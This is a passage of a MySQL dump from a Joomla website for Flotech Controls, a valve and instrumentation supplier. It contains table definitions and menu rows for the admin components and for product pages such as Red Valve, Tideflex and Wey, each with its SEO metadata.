('384cbdadb775585e77fcc2ddb6f44e33', 0, 103, 'captcha_answer', '2015-04-07 21:21:54', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_foxcontact_settings`
--

CREATE TABLE IF NOT EXISTS `j6kpf_foxcontact_settings` (
  `name` varchar(32) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `j6kpf_foxcontact_settings`
--

INSERT INTO `j6kpf_foxcontact_settings` (`name`, `value`) VALUES
('captchadrawer', 'use_gd'),
('mimefilter', 'use_fileinfo');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_languages`
--

CREATE TABLE IF NOT EXISTS `j6kpf_languages` (
  `lang_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `lang_code` char(7) NOT NULL,
  `title` varchar(50) NOT NULL,
  `title_native` varchar(50) NOT NULL,
  `sef` varchar(50) NOT NULL,
  `image` varchar(50) NOT NULL,
  `description` varchar(512) NOT NULL,
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `sitename` varchar(1024) NOT NULL DEFAULT '',
  `published` int(11) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`lang_id`),
  UNIQUE KEY `idx_sef` (`sef`),
  UNIQUE KEY `idx_image` (`image`),
  UNIQUE KEY `idx_langcode` (`lang_code`),
  KEY `idx_access` (`access`),
  KEY `idx_ordering` (`ordering`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `j6kpf_languages`
--

INSERT INTO `j6kpf_languages` (`lang_id`, `lang_code`, `title`, `title_native`, `sef`, `image`, `description`, `metakey`, `metadesc`, `sitename`, `published`, `access`, `ordering`) VALUES
(1, 'en-GB', 'English (UK)', 'English (UK)', 'en', 'en', '', '', '', '', 1, 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_menu`
--

CREATE TABLE IF NOT EXISTS `j6kpf_menu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `menutype` varchar(24) NOT NULL COMMENT 'The type of menu this item belongs to. FK to #__menu_types.menutype',
  `title` varchar(255) NOT NULL COMMENT 'The display title of the menu item.',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL COMMENT 'The SEF alias of the menu item.',
  `note` varchar(255) NOT NULL DEFAULT '',
  `path` varchar(1024) NOT NULL COMMENT 'The computed path of the menu item based on the alias field.',
  `link` varchar(1024) NOT NULL COMMENT 'The actually link the menu item refers to.',
  `type` varchar(16) NOT NULL COMMENT 'The type of link: Component, URL, Alias, Separator',
  `published` tinyint(4) NOT NULL DEFAULT '0' COMMENT 'The published state of the menu link.',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '1' COMMENT 'The parent menu item in the menu tree.',
  `level` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'The relative level in the tree.',
  `component_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to #__extensions.id',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to #__users.id',
  `checked_out_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT 'The time the menu item was checked out.',
  `browserNav` tinyint(4) NOT NULL DEFAULT '0' COMMENT 'The click behaviour of the link.',
  `access` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'The access level required to view the menu item.',
  `img` varchar(255) NOT NULL COMMENT 'The image of the menu item.',
  `template_style_id` int(10) unsigned NOT NULL DEFAULT '0',
  `params` text NOT NULL COMMENT 'JSON encoded data for the menu item.',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `home` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Indicates if this menu item is the home or default page.',
  `language` char(7) NOT NULL DEFAULT '',
  `client_id` tinyint(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_client_id_parent_id_alias_language` (`client_id`,`parent_id`,`alias`,`language`),
  KEY `idx_componentid` (`component_id`,`menutype`,`published`,`access`),
  KEY `idx_menutype` (`menutype`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_path` (`path`(255)),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=134 ;

--
-- Dumping data for table `j6kpf_menu`
--

INSERT INTO `j6kpf_menu` (`id`, `menutype`, `title`, `alias`, `note`, `path`, `link`, `type`, `published`, `parent_id`, `level`, `component_id`, `checked_out`, `checked_out_time`, `browserNav`, `access`, `img`, `template_style_id`, `params`, `lft`, `rgt`, `home`, `language`, `client_id`) VALUES
(1, '', 'Menu_Item_Root', 'root', '', '', '', '', 1, 0, 0, 0, 0, '0000-00-00 00:00:00', 0, 0, '', 0, '', 0, 99, 0, '*', 0),
(2, 'menu', 'com_banners', 'Banners', '', 'Banners', 'index.php?option=com_banners', 'component', 0, 1, 1, 4, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners', 0, '', 1, 10, 0, '*', 1),
(3, 'menu', 'com_banners', 'Banners', '', 'Banners/Banners', 'index.php?option=com_banners', 'component', 0, 2, 2, 4, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners', 0, '', 2, 3, 0, '*', 1),
(4, 'menu', 'com_banners_categories', 'Categories', '', 'Banners/Categories', 'index.php?option=com_categories&extension=com_banners', 'component', 0, 2, 2, 6, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners-cat', 0, '', 4, 5, 0, '*', 1),
(5, 'menu', 'com_banners_clients', 'Clients', '', 'Banners/Clients', 'index.php?option=com_banners&view=clients', 'component', 0, 2, 2, 4, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners-clients', 0, '', 6, 7, 0, '*', 1),
(6, 'menu', 'com_banners_tracks', 'Tracks', '', 'Banners/Tracks', 'index.php?option=com_banners&view=tracks', 'component', 0, 2, 2, 4, 0, '0000-00-00 00:00:00', 0, 0, 'class:banners-tracks', 0, '', 8, 9, 0, '*', 1),
(7, 'menu', 'com_contact', 'Contacts', '', 'Contacts', 'index.php?option=com_contact', 'component', 0, 1, 1, 8, 0, '0000-00-00 00:00:00', 0, 0, 'class:contact', 0, '', 11, 16, 0, '*', 1),
(8, 'menu', 'com_contact', 'Contacts', '', 'Contacts/Contacts', 'index.php?option=com_contact', 'component', 0, 7, 2, 8, 0, '0000-00-00 00:00:00', 0, 0, 'class:contact', 0, '', 12, 13, 0, '*', 1),
(9, 'menu', 'com_contact_categories', 'Categories', '', 'Contacts/Categories', 'index.php?option=com_categories&extension=com_contact', 'component', 0, 7, 2, 6, 0, '0000-00-00 00:00:00', 0, 0, 'class:contact-cat', 0, '', 14, 15, 0, '*', 1),
(10, 'menu', 'com_messages', 'Messaging', '', 'Messaging', 'index.php?option=com_messages', 'component', 0, 1, 1, 15, 0, '0000-00-00 00:00:00', 0, 0, 'class:messages', 0, '', 17, 22, 0, '*', 1),
(11, 'menu', 'com_messages_add', 'New Private Message', '', 'Messaging/New Private Message', 'index.php?option=com_messages&task=message.add', 'component', 0, 10, 2, 15, 0, '0000-00-00 00:00:00', 0, 0, 'class:messages-add', 0, '', 18, 19, 0, '*', 1),
(12, 'menu', 'com_messages_read', 'Read Private Message', '', 'Messaging/Read Private Message', 'index.php?option=com_messages', 'component', 0, 10, 2, 15, 0, '0000-00-00 00:00:00', 0, 0, 'class:messages-read', 0, '', 20, 21, 0, '*', 1),
(13, 'menu', 'com_newsfeeds', 'News Feeds', '', 'News Feeds', 'index.php?option=com_newsfeeds', 'component', 0, 1, 1, 17, 0, '0000-00-00 00:00:00', 0, 0, 'class:newsfeeds', 0, '', 23, 28, 0, '*', 1),
(14, 'menu', 'com_newsfeeds_feeds', 'Feeds', '', 'News Feeds/Feeds', 'index.php?option=com_newsfeeds', 'component', 0, 13, 2, 17, 0, '0000-00-00 00:00:00', 0, 0, 'class:newsfeeds', 0, '', 24, 25, 0, '*', 1),
(15, 'menu', 'com_newsfeeds_categories', 'Categories', '', 'News Feeds/Categories', 'index.php?option=com_categories&extension=com_newsfeeds', 'component', 0, 13, 2, 6, 0, '0000-00-00 00:00:00', 0, 0, 'class:newsfeeds-cat', 0, '', 26, 27, 0, '*', 1),
(16, 'menu', 'com_redirect', 'Redirect', '', 'Redirect', 'index.php?option=com_redirect', 'component', 0, 1, 1, 24, 0, '0000-00-00 00:00:00', 0, 0, 'class:redirect', 0, '', 43, 44, 0, '*', 1),
(17, 'menu', 'com_search', 'Basic Search', '', 'Basic Search', 'index.php?option=com_search', 'component', 0, 1, 1, 19, 0, '0000-00-00 00:00:00', 0, 0, 'class:search', 0, '', 33, 34, 0, '*', 1),
(18, 'menu', 'com_weblinks', 'Weblinks', '', 'Weblinks', 'index.php?option=com_weblinks', 'component', 0, 1, 1, 21, 0, '0000-00-00 00:00:00', 0, 0, 'class:weblinks', 0, '', 35, 40, 0, '*', 1),
(19, 'menu', 'com_weblinks_links', 'Links', '', 'Weblinks/Links', 'index.php?option=com_weblinks', 'component', 0, 18, 2, 21, 0, '0000-00-00 00:00:00', 0, 0, 'class:weblinks', 0, '', 36, 37, 0, '*', 1),
(20, 'menu', 'com_weblinks_categories', 'Categories', '', 'Weblinks/Categories', 'index.php?option=com_categories&extension=com_weblinks', 'component', 0, 18, 2, 6, 0, '0000-00-00 00:00:00', 0, 0, 'class:weblinks-cat', 0, '', 38, 39, 0, '*', 1),
(21, 'menu', 'com_finder', 'Smart Search', '', 'Smart Search', 'index.php?option=com_finder', 'component', 0, 1, 1, 27, 0, '0000-00-00 00:00:00', 0, 0, 'class:finder', 0, '', 31, 32, 0, '*', 1),
(22, 'menu', 'com_joomlaupdate', 'Joomla! Update', '', 'Joomla! Update', 'index.php?option=com_joomlaupdate', 'component', 0, 1, 1, 28, 0, '0000-00-00 00:00:00', 0, 0, 'class:joomlaupdate', 0, '', 41, 42, 0, '*', 1),
(23, 'main', 'com_tags', 'Tags', '', 'Tags', 'index.php?option=com_tags', 'component', 0, 1, 1, 29, 0, '0000-00-00 00:00:00', 0, 1, 'class:tags', 0, '', 47, 48, 0, '', 1),
(101, 'mainmenu', 'Home', 'home', '', 'home', 'index.php?option=com_content&view=featured', 'component', 1, 1, 1, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"featured_categories":[""],"layout_type":"blog","num_leading_articles":"1","num_intro_articles":"3","num_columns":"3","num_links":"0","multi_column_order":"1","orderby_pri":"","orderby_sec":"front","order_date":"","show_pagination":"2","show_pagination_results":"1","show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"1","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Flotech Controls | Red Valve | Tideflex | Wey | Valvtechnologies | SOR | Birkett | Copes Vulcan | MTS Victaulic | Noreva | Knife gate valve | Ball Valve | Pinch Valve ","show_page_heading":0,"page_heading":"","pageclass_sfx":"home_page_css","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Red Valve,Tideflex,Wey,Valvtechnologies,SOR,Birkett,Copes Vulcan,MTS Victaulic,Noreva,Knife gate valve,Ball Valve,Pinch Valve,Duckbill check valve,Non return valve,\\r\\nControl valve,Safety Relief Valve,Pressure Relief Valve,Pressure reducing valve,High pressure high temperature valves,level, flow, temperature and pressure instrumentation products\\r\\n","robots":"","secure":0}', 29, 30, 1, '*', 0),
(102, 'mainmenu', 'Home', '2013-04-12-06-10-56', '', '2013-04-12-06-10-56', '#', 'url', -2, 1, 1, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 45, 46, 0, '*', 0),
(103, 'mainmenu', 'About us', 'about-us', '', 'about-us', 'index.php?option=com_content&view=article&id=1', 'component', 1, 1, 1, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Flotech Controls | Red Valve | Tideflex | Wey | Valvtechnologies | SOR | Birkett | Copes Vulcan | MTS Victaulic | Noreva | Knife gate valve | Ball Valve | Pinch Valve","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Red Valve,Tideflex,Wey,Valvtechnologies,SOR,Birkett,Copes Vulcan,MTS Victaulic,Noreva,Knife gate valve,Ball Valve,Pinch Valve,Duckbill check valve,Non return valve,\\r\\nControl valve,Safety Relief Valve,Pressure Relief Valve,Pressure reducing valve,High pressure high temperature valves,level, flow, temperature and pressure instrumentation products\\r\\n","robots":"","secure":0}', 49, 50, 0, '*', 0),
(104, 'mainmenu', 'Products', 'products', '', 'products', '', 'url', 1, 1, 1, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 51, 70, 0, '*', 0),
(105, 'mainmenu', 'Application sectors', 'application-sectors', '', 'application-sectors', '#', 'url', 1, 1, 1, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1}', 71, 80, 0, '*', 0),
(106, 'mainmenu', 'contact us', 'contact-us', '', 'contact-us', 'index.php?option=com_content&view=article&id=2', 'component', 1, 1, 1, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Contact Us | Flotech Controls | Red Valve | Tideflex | Wey | Valvtechnologies | SOR | Birkett | Copes Vulcan | MTS Victaulic | Noreva | Knife gate valve | Ball Valve | Pinch Valve","show_page_heading":0,"page_heading":"","pageclass_sfx":"contactus_page","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Red Valve,Tideflex,Wey,Valvtechnologies,SOR,Birkett,Copes Vulcan,MTS Victaulic,Noreva,Knife gate valve,Ball Valve,Pinch Valve,Duckbill check valve,Non return valve,\\r\\nControl valve,Safety Relief Valve,Pressure Relief Valve,Pressure reducing valve,High pressure high temperature valves,level, flow, temperature and pressure instrumentation products\\r\\n","robots":"","secure":0}', 81, 82, 0, '*', 0),
(112, 'mainmenu', 'Red Valve', 'red-valve', '', 'products/red-valve', 'index.php?option=com_content&view=article&id=4', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Red Valve | Valve Manufacturer | Pinch Valves | Tideflex Check Valves | Pressure Sensors | Slurry Knife Gates | Redflex Expansion Joints | Tideflex Diffuser valves | Duckbill check valve","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Red Valve,Valve Manufacturer,Pinch Valves,Tideflex Check Valves,Pressure Sensors,Slurry Knife Gates,Redflex Expansion Joints,Tideflex Diffuser valves,\\r\\nDuckbill check valve,Aeration and mixing systems,Stormwater backflow prevention,Non return valve,Elastomer valves,Air actuated pinch valve,\\r\\nPinch valve sleeves,Manual pinch valves,Control pinch valves,Flow control applications,Slurry valves,Effluent and grit diffuser systems","robots":"","secure":0}', 52, 53, 0, '*', 0),
(113, 'mainmenu', 'Tideflex', 'tideflex', '', 'products/tideflex', 'index.php?option=com_content&view=article&id=5', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Tideflex | Duckbill Check Valve| Curved duckbill check valve | Stormwater backflow prevention | Elastomer Valves | Checkmate | In-Line Check Valves | Slip on Check Valves | Aeration and mixing systems | Effluent Diffuser Systems | Flanged check valve | Wastewater treatment valves | Stormwater and wastewater collection and discharge","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Tideflex,Duckbill Check Valve,Curved duckbill check valve,Stormwater backflow prevention,Elastomer Valves,Checkmate\\r\\n,In-Line Check Valves,Slip on Check Valves,Aeration and mixing systems,Effluent Diffuser Systems,Flanged check valve\\r\\n,Wastewater treatment valves,Stormwater and wastewater collection and discharge","robots":"","secure":0}', 54, 55, 0, '*', 0),
(114, 'mainmenu', 'Wey', 'wey', '', 'products/wey', 'index.php?option=com_content&view=article&id=6', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Wey Valves | Sistag | Knife Gate Valve | Performance Gate Valve | Bi-Directional | ANSI 600lb valve | Isolation valve | Tailings Disposal Valve | Valves for slurry applications | Zero leakage valve | Bubble tight shut off valve | Fly Ash valve | Double block and bleed valve","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Wey Valves,Sistag,Knife Gate Valve,Performance Gate Valve,Bi-Directional,ANSI 600lb valve,Isolation valve\\r\\n,Tailings Disposal Valve,Valves for slurry applications,Zero leakage valve,Bubble tight shut off valve,\\r\\nFly Ash valve,Double block and bleed valve,Valves for abrasive applications,Valves for cyclones,\\r\\n,Valves for mining process plants,High pressure acid leaching valves\\r\\n","robots":"","secure":0}', 56, 57, 0, '*', 0),
(115, 'mainmenu', 'Noreva', 'noreva', '', 'products/noreva', 'index.php?option=com_content&view=article&id=3', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Noreva | Nozzle check valve | Non return valve | Check valve | Low inertia non return valve | Short stroke check valve | Valves for water pump stations","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Noreva,Nozzle check valve,Non return valve,Check valve,Low inertia non return valve,Short stroke check valve,Valves for water pump stations\\r\\n,Valves for desalination,Non slam check valve,Centrally guided check valve,Radially guided check valve","robots":"","secure":0}', 58, 59, 0, '*', 0),
(116, 'mainmenu', 'Valvtechnologies', 'valvtechnologies', '', 'products/valvtechnologies', 'index.php?option=com_content&view=article&id=8', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Valvtechnologies | High pressure valves | High temperature valves | Metal Seated Ball valves | Zero leakage valves | Severe service valves | Valves for corrosive and abrasive applications | Valves for slurries | Fly Ash valve ","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Valvtechnologies,High pressure valves,High temperature valves,Metal Seated Ball valves,Zero leakage valves,Severe service valves,\\r\\nValves for corrosive and abrasive applications,Valves for slurries,Fly Ash valve,Acid injection valves,Abrasotech,Trunnion mounted ball valves\\r\\n,Parallel Slide Gate Valve,Autoclave Acid Injection,Nextech,Xactrol,Steam Drain Valves,Electronic Relief Valves,Valves for mole sieves,Actuated ball valve\\r\\n","robots":"","secure":0}', 60, 61, 0, '*', 0),
(117, 'mainmenu', 'Birkett', 'birkett', '', 'products/birkett', 'index.php?option=com_content&view=article&id=9', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Birkett | Safety Systems UK | Pressure Relief Valve | Safety Relief Valve | Safeset Pilot Operated Safety Relief Valve |  | Safeflo Pilot Safety and Thermal Relief Valves | WB Series Spring loaded safety relief valves Oil and gas pressure relief valves | Power pressure relief valves","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Birkett,Safety Systems UK,Pressure Relief Valve,Safety Relief Valve,Safeset Pilot Operated Safety Relief Valve,,Safeflo Pilot Safety and Thermal Relief Valves,WB Series Spring loaded safety relief valves\\r\\nOil and gas pressure relief valves,Power pressure relief valves\\r\\n","robots":"","secure":0}', 62, 63, 0, '*', 0),
(118, 'mainmenu', 'SOR', 'sor', '', 'products/sor', 'index.php?option=com_content&view=article&id=7', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"SOR | Static o-ring | Pressure Switch | Pressure Transmitter | Level Switch | Level Transmitter | aFlow Switch","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"SOR,level, flow, temperature and pressure instrumentation products,Static o-ring,Pressure Switch,Pressure Transmitter,Level Switch,Level Transmitter,aFlow Switch","robots":"","secure":0}', 64, 65, 0, '*', 0),
(119, 'mainmenu', 'Power', 'power', '', 'application-sectors/power', 'index.php?option=com_content&view=article&id=10', 'component', 1, 105, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Valvtechnologies | Copes Vulcan | Birkett | SOR | Wey | Control valve | Metal seated ball valve | Knife gate valve | Pinch valve | Safety relief valve | Pressure relief valve | Pressure reducing valve | Drain isolation valve | Zero Leakage | Turbine Bypass | Desuperheater | Steam conditioning valve | Parallel slide gate valve ","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Valvtechnologies,Copes Vulcan,Birkett,SOR,Wey,Control valve,Metal seated ball valve,Knife gate valve,Pinch valve,Safety relief valve,Pressure relief valve\\r\\n,Pressure reducing valve,Drain isolation valve,Zero Leakage,Turbine Bypass,Desuperheater,Steam conditioning valve,Parallel slide gate valve,level, flow, temperature and pressure instrumentation products\\r\\n,High pressure, high temperature valves\\r\\n","robots":"","secure":0}', 72, 73, 0, '*', 0),
(120, 'mainmenu', 'Water', 'water', '', 'application-sectors/water', 'index.php?option=com_content&view=article&id=12', 'component', 1, 105, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Red Valve | Tideflex | Wey | Noreva | MTS | Duckbill check valve | Plug valve | Diffuser | Knife gate valve | Ball valve | Pinch Valve | Control valve | Mixing and aeration systems","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Red Valve,Tideflex,Wey,Noreva,MTS,Duckbill check valve,Plug valve,Diffuser,Knife gate valve,Ball valve,Pinch Valve,Control valve,Mixing and aeration systems\\r\\n,Effluent diffuser systems,Zero leakage valves,Desalination valves,Pump station valves,Stormwater backflow prevention\\r\\n","robots":"index, follow","secure":0}', 74, 75, 0, '*', 0),
